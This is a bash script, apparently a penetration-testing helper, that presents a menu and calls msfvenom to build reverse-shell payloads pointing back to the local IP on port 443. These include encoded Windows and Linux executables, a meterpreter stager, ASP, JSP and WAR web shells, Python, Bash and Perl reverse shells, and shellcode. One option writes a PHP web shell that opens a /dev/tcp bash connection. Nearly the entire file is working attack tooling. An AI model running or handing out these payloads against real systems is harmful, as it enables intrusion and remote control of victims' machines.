#!/bin/bash

#Local IP
listener=`ifconfig eth0 | awk '{print $2}' |grep [0-9] | sed -n 2p`

if [[ $# -eq 0 ]]; then
  echo -e "\e[00;36m-----------------------------------------------------\e[00m"
  echo -e "\e[00;36m[-]\e[00m \e[00;32mPayload Generator | Listener $listener:443\e[00m \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]-----------------------------------------------[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m \e[00;32mBinaries \e[00m                                     \e[00;36m[-]\e[00m" 
  echo -e "\e[00;36m[-]\e[00m 1 = Linux binary non-staged                   \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m 2 = Windows binary non-staged                 \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m 3 = Windows binary staged                     \e[00;36m[-]\e[00m" 
  echo -e "\e[00;36m[-]\e[00m                                               \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m \e[00;32mWeb \e[00m                                          \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m 10 = ASP non-staged                           \e[00;36m[-]\e[00m" 
  echo -e "\e[00;36m[-]\e[00m 11 = JSP non-staged                           \e[00;36m[-]\e[00m" 
  echo -e "\e[00;36m[-]\e[00m 12 = WAR non-staged                           \e[00;36m[-]\e[00m" 
  echo -e "\e[00;36m[-]\e[00m 13 = PHP Linux Reverse shell                  \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m                                               \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m \e[00;32mScripting \e[00m                                    \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m 20 = Python non-staged                        \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m 21 = Bash non-staged                          \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m 22 = Perl non-staged                          \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m                                               \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m \e[00;32mShellcode \e[00m                                    \e[00;36m[-]\e[00m" 
  echo -e "\e[00;36m[-]\e[00m 30 = Linux Python shellcode non-staged        \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m 31 = Linux C shellcode non-staged             \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m 32 = Windows Python shellcode non-staged      \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m[-]\e[00m 33 = Windows C shellcode non-staged           \e[00;36m[-]\e[00m"
  echo -e "\e[00;36m-----------------------------------------------------\e[00m"
  exit 0
fi


#BINARY
if [ $1 == 1 ]; then
  echo "[+] Linux binary non-staged | Listner $listener:443[+]"
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$listener LPORT=443 -f elf -e x86/shikata_ga_nai -o Payload/Linux/LnS.elf
else
  :
fi

if [ $1 == 2 ]; then
  echo "[+] Windows binary non-staged | Listner $listener:443 [+]"
  msfvenom -p windows/shell_reverse_tcp LHOST=$listener LPORT=443 -f exe -e x86/shikata_ga_nai -o Payload/Windows/WnS.exe
else
  :
fi

if [ $1 == 3 ]; then
  echo "[+] Windows binary staged | Listner $listener:443 [+]"
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$listener LPORT=443 -f exe -e x86/shikata_ga_nai -o Payload/Windows/WS.exe
else
  :
fi


#WEB Payloads
if [ $1 == 10 ]; then
  echo "[+] ASP non-staged | Listner $listener:443 [+]"
  msfvenom -p windows/shell_reverse_tcp LHOST=$listener LPORT=443 -f asp -o Payload/Web/WnS.asp
else
  :
fi

if [ $1 == 11 ]; then
  echo "[+] JSP non-staged | Listner $listener:443 [+]"
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$listener LPORT=443 -f raw -o Payload/Web/JnS.jsp
else
  :
fi

if [ $1 == 12 ]; then
  echo "[+] WAR non-staged | Listner $listener:443 [+]"
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=$listener LPORT=443 -f war -o Payload/Web/WanS.war
else
  :
fi

if [ $1 == 13 ]; then
  echo "[+] PHP Linux reverse connection | Listner $listener:443 [+]"
  echo '<?php echo shell_exec("0<&65-;exec 65<>/dev/tcp/'$listener'/443;/bin/bash <&65 >&65 2>&65");?>' > Payload/Web/evilL.txt
  cat Payload/evilL.txt
else
  :
fi

#SCRIPTING Payloads
if [ $1 == 20 ]; then
  echo "[+] Python non-staged | Listner $listener:443 [+]"
  msfvenom -p cmd/unix/reverse_python LHOST=$listener LPORT=443 -f raw -o Payload/Scripting/rs.py
  cat Payload/rs.py
  echo
else
  :
fi

if [ $1 == 21 ]; then
  echo "[+] Bash non-staged | Listner $listener:443 [+]"
  msfvenom -p cmd/unix/reverse_bash LHOST=$listener LPORT=443 -f raw -o Payload/Linux/rs.sh
  cat Payload/rs.sh
  echo
else
  :
fi

if [ $1 == 22 ]; then
  echo "[+] Perl non-staged | Listner $listener:443 [+]"
  msfvenom -p cmd/unix/reverse_perl LHOST=$listener LPORT=443 -f raw -o Payload/Scripting/rs.pl
  cat Payload/rs.pl
  echo
else
  :
fi


#SHELLCODE Payloads
if [ $1 == 30 ]; then
  echo "[+] Linux Python shellcode non-staged | Listner $listener:443 [+]"
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$listener LPORT=443 -f py -e x86/shikata_ga_nai -b $2
else
  :
fi

if [ $1 == 31 ]; then
  echo "[+] Linux C shellcode non-staged | Listner $listener:443 [+]"
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=$listener LPORT=443 -f c -e x86/shikata_ga_nai -b $2
else
  :
fi

if [ $1 == 32 ]; then
  echo "[+] Windows Python shellcode non-staged | Listner $listener:443 [+]"
  msfvenom -p windows/shell_reverse_tcp LHOST=$listener LPORT=443 -f py -e x86/shikata_ga_nai -b $2
else
  :
fi

if [ $1 == 33 ]; then
  echo "[+] Windows C shellcode non-staged | Listner $listener:443 [+]"
  msfvenom -p windows/shell_reverse_tcp LHOST=$listener LPORT=443 -f c -e x86/shikata_ga_nai -b $2
else
  :
fi
